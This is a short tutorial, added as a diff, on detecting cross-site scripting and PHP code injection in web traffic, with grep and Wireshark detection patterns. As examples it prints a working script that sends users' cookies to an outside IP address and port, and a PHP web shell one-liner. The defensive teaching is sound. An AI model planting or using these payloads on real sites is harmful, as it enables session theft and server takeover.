@@ -1,0 +1,54 @@
+Understanding Cross-Site Scripting (XSS)
+
+Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into a trusted website. Unlike other attacks that target the server directly, XSS targets the users of the website.
+
+The website acts as a "delivery vehicle." Because the script comes from a site the user trusts, the browser has no way to know the script is malicious and will execute it. This allows attackers to bypass the Same-Origin Policy, giving them the power to read the user's cookies, capture keystrokes, or redirect the user to a fraudulent site.
+
+Cross-Site Scripting (XSS) & Code Injection Detection
+
+Suppose we were looking through our HTTP requests and noticed that a good amount of requests were being sent to an internal "server" we did not recognize. This could be a clear indication of cross-site scripting.
+1. Client-Side Injection (XSS)
+
+Attackers utilize this technique to steal tokens, cookies, and session values. If we were to find the root of the injection (for example, in a comment section), it might look like this:
+JavaScript
+
+<script>
+  window.addEventListener("load", function() {
+    const url = "http://192.168.0.19:5555";
+    const params = "cookie=" + encodeURIComponent(document.cookie);
+    const request = new XMLHttpRequest();
+    request.open("GET", url + "?" + params);
+    request.send();
+  });
+</script>
+
+2. Server-Side Injection (PHP)
+
+Attackers might also attempt to inject PHP code to gain control over the server (Remote Code Execution):
+
+    Command and Control (C2): <?php system($_GET['cmd']); ?>
+
+    Information Gathering: <?php echo whoami ?>
+
+How to Detect These Attacks
+
+Detection requires looking at both the Inbound request (the injection) and the Outbound behavior (the exfiltration).
+A. Detecting the Injection (Inbound)
+
+    Log Analysis: Search for common script tags or PHP functions in web access logs.
+
+        Command: grep -E "(<script|system\(|eval\(|whoami)" access.log
+
+    Wireshark Filter: Look for suspicious characters in HTTP URIs or POST bodies.
+
+        Filter: http.request.uri contains "<script>" or http.request.uri contains "php"
+
+B. Detecting the Impact (Outbound)
+
+    Unusual Destinations: Look for HTTP requests originating from your network (or your users) directed toward unknown IP addresses or strange ports (like 5555).
+
+    Data in URLs: In Wireshark, look for GET requests where the parameters look like encoded cookies or session IDs.
+
+        Filter: http.request.uri contains "cookie=" or http.request.uri contains "session="
+
+    Referer Header: If a user's browser is sending data to an attacker's server, the Referer header in that malicious request will often point back to your own website.
